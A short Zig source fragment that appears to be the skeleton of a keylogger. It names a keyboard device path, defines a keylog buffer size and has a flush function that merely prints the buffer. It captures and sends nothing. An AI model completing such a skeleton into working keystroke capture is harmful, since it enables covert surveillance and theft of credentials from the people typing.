const std = @import("std");
const keyboard = "/dev/input/keyboard";
const stack = "/dev/io-pkt-stm";
const KEYLOG_BUF_SIZE = 2048;
fn flush_keylog(buffer: []const u8) void {
    std.debug.print("{s}", .{buffer});
}
